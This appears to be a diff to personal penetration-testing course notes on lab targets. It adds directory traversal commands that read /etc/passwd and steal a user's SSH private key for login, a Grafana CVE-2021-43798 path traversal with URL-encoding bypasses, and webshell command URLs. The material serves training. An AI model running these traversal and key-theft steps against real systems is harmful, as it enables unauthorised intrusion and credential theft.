@@ -380,6 +380,7 @@
      - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
         The output of /etc/passwd shows a user called "offsec"
      - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
+     - `chmod 400 dt_key`
      - `ssh -i dt_key -p 2222 offsec@mountaindesserts.com`: connect SSH from stolen private key
      - `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`: URL encoding ../
    - **File inclusion vulnerabilities**: allow us to “include” a file in the application’s running code.
@@ -670,7 +671,21 @@
     - `zip webshell.zip webshell.php`
     - Upload plugin.zip and activate
     - `http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=find%20/%20-name%20flag%202%3E/dev/null`: find flag  
-    - `http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag`  
+    - `http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag`
+
+### Common Web Application Attacks  
+- 9.1.2 Identifying and Exploiting Directory Traversals
+  - obtain SSH private key for the user offsec then SSH
+    - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
+    - nano dt_key (-----BEGIN OPENSSH PRIVATE KEY----- -----END OPENSSH PRIVATE KEY-----)
+    - ssh -i dt_key -p 2222 offsec@mountaindesserts.com  
+  - golangexample cve-2021-43798 port 3000
+    - `curl --path-as-is http://192.168.163.193:3000/public/plugins/alertlist/../../../../../../../../users/install.txt`
+- 9.1.3 Encoding special chrs
+  - url encoding (Don't normalize the url)
+    - `curl --path-as-is http://192.168.163.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords`
+  - Grafana URL partial encoding bypass
+    - `curl --path-as-is http://192.168.163.16:3000/public/plugins/alertlist/%2E./%2E./%2E./%2E./../../../../opt/install.txt`
     
 ### Password Attacks  
 - 16.1.1 SSH and RDP
